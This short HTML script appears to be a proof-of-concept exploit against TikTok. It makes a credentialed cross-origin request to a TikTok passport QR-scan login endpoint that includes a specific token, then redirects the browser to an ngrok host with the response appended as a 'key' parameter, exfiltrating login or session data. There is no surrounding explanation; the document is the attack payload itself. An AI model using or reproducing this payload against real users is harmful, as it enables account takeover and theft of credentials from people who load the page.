<script>
var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www.tiktok.com/passport/web/scan_index/?aid=1459&append_common_params=1&hide_nav_bar=1&next_url=https%3A%2F%2Fwww.tiktok.com%2Fpassport%2Fweb%2Fscan_qrcode%2F&qr_source_aid=1459&token=zAe1UfD1xr72yDFNLmC8VzPnsnr0v3aV9HUd-F6RWQM%3D_sg1");
xhr.withCredentials = true;
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
</script>
